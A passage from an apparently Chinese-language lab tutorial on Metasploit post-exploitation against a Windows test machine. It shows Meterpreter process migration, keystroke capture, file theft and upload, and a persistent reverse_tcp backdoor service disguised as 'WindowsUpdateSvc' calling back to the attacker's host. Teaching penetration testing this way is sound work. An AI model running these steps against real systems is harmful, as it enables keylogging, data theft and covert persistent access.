&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;696&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e WORK SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;760&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;836&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;868&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;988&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e WORK SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1052&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; spoolsv.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\S&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\s&lt;/span&gt;poolsv.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1072&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1168&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1192&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; wmpnetwk.e x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe WORK SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1368&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt; explorer.e x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\E&lt;/span&gt;xplor
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe er.EXE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1420&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; sppsvc.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; WORK SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1656&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1692&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e WORK SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1760&lt;/span&gt; &lt;span class="m"&gt;1368&lt;/span&gt; taskmgr.ex x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e 32&lt;span class="se"&gt;\t&lt;/span&gt;askmgr.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1916&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1960&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; taskhost.e x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe 32&lt;span class="se"&gt;\t&lt;/span&gt;askhost.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2028&lt;/span&gt; &lt;span class="m"&gt;836&lt;/span&gt; dwm.exe x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 32&lt;span class="se"&gt;\D&lt;/span&gt;wm.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2308&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2316&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2468&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2476&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2716&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2724&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2920&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2928&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;3044&lt;/span&gt; &lt;span class="m"&gt;1368&lt;/span&gt; notepad.ex x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e 32&lt;span class="se"&gt;\N&lt;/span&gt;OTEPAD.EXE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; migrate &lt;span class="m"&gt;1368&lt;/span&gt; &lt;span class="c1"&gt;# 迁移到用户进程从而提取到用户权限&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Migrating from &lt;span class="m"&gt;1052&lt;/span&gt; to 1368...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Migration completed successfully.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid &lt;span class="c1"&gt;# 当前权限为Ankh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_start &lt;span class="c1"&gt;# 开始键盘嗅探&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting the keystroke sniffer ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_dump &lt;span class="c1"&gt;# 打印“Hello？”&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dumping captured keystrokes...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;Shift&amp;gt;Hello&amp;lt;Shift&amp;gt;?
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_stop &lt;span class="c1"&gt;# 结束键盘嗅探&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Stopping the keystroke sniffer...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;PS：切换到用户身份之后一般很难提升到SYSTEM权限（Windows安全机制），如果尝试&lt;code&gt;getsystem&lt;/code&gt;无果，则&lt;code&gt;background&lt;/code&gt; -&amp;gt; &lt;code&gt;run&lt;/code&gt;重新执行exploit&lt;/p&gt;
&lt;h5 id="3-文件窃取与上传"&gt;3. 文件窃取与上传
&lt;/h5&gt;&lt;p&gt;下载上一步中靶机桌面保存的&lt;code&gt;hello.txt&lt;/code&gt;文件并上传一个&lt;code&gt;hi.txt&lt;/code&gt;文件（可以是可执行的恶意程序）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; cat C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt;hello.txt &lt;span class="c1"&gt;# 文件读取&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hello?meterpreter &amp;gt; download C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt;hello.txt /home/kali/Desktop &lt;span class="c1"&gt;# 把文件下载到Kali桌面&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Downloading: C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Downloaded 6.00 B of 6.00 B &lt;span class="o"&gt;(&lt;/span&gt;100.0%&lt;span class="o"&gt;)&lt;/span&gt;: C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Desktop&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Hi\!&amp;#34;&lt;/span&gt; &amp;gt; hi.txt &lt;span class="c1"&gt;# Kali终端创建文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; upload /home/kali/Desktop/hi.txt &amp;gt; C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="c1"&gt;# 上传文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id="三metasploit持久化后门攻击"&gt;三、Metasploit持久化后门攻击
&lt;/h4&gt;&lt;h5 id="利用windows服务机制实现权限维持"&gt;利用Windows服务机制实现权限维持
&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;Kali通过MS17-010漏洞获得靶机SYSTEM权限会话后，使用&lt;code&gt;persistence_service&lt;/code&gt;模块创建持久化后门&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端1：攻击配置：&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; use exploit/windows/local/persistence_service &lt;span class="c1"&gt;# 持久化服务模块&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; No payload configured, defaulting to windows/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp &lt;span class="c1"&gt;# 将攻击载荷设置为32位（默认），64位会出现不兼容情况&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; SESSION &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;# 设置为当前获取到SYSTEM权限的会话ID。可以通过sessions指令查看&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;SESSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST 10.0.0.223 &lt;span class="c1"&gt;# 设置为Kali IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;4446&lt;/span&gt; &lt;span class="c1"&gt;# 指定一个监听端口&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;4446&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; SERVICE_NAME WindowsUpdateSvc
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;SERVICE_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; WindowsUpdateSvc &lt;span class="c1"&gt;# 将服务名伪装&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
